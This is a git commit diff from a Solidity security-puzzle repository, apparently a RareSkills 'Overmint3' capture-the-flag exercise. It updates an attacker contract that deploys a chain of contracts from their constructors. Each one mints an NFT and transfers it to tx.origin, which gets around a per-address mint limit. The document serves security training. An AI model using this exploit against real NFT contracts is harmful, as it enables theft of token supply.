b40a80fc267ebcf65ce6965ade31c5a287323619
ElvinsJ <caoyifeng007@163.com>
2022-11-04 21:25:37 +0800

    RareSkill puzzles Overmint3 Complete

--- week8/solidity-riddles-main/contracts/Overmint3Attacker.sol
+++ week8/solidity-riddles-main/contracts/Overmint3Attacker.sol
@@ -1,14 +1,14 @@
 // SPDX-License-Identifier: GPL-3.0
 pragma solidity 0.8.15;
-import "./Overmint2.sol";
+import "./Overmint3.sol";
 import "hardhat/console.sol";
 import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
 
 contract Overmint3Attacker {
     constructor(address addr) {
-        Overmint2(addr).mint();
+        Overmint3(addr).mint();
 
-        Overmint2(addr).transferFrom(address(this), tx.origin, 1);
+        Overmint3(addr).transferFrom(address(this), tx.origin, 1);
 
         new A(addr);
     }
@@ -16,35 +16,35 @@ contract Overmint3Attacker {
 
 contract A {
     constructor(address addr) {
-        Overmint2(addr).mint();
+        Overmint3(addr).mint();
 
-        Overmint2(addr).transferFrom(address(this), tx.origin, 2);
+        Overmint3(addr).transferFrom(address(this), tx.origin, 2);
         new B(addr);
     }
 }
 
 contract B {
     constructor(address addr) {
-        Overmint2(addr).mint();
+        Overmint3(addr).mint();
 
-        Overmint2(addr).transferFrom(address(this), tx.origin, 3);
+        Overmint3(addr).transferFrom(address(this), tx.origin, 3);
         new C(addr);
     }
 }
 
 contract C {
     constructor(address addr) {
-        Overmint2(addr).mint();
+        Overmint3(addr).mint();
 
-        Overmint2(addr).transferFrom(address(this), tx.origin, 4);
+        Overmint3(addr).transferFrom(address(this), tx.origin, 4);
         new D(addr);
     }
 }
 
 contract D {
     constructor(address addr) {
-        Overmint2(addr).mint();
+        Overmint3(addr).mint();
 
-        Overmint2(addr).transferFrom(address(this), tx.origin, 5);
+        Overmint3(addr).transferFrom(address(this), tx.origin, 5);
     }
 }
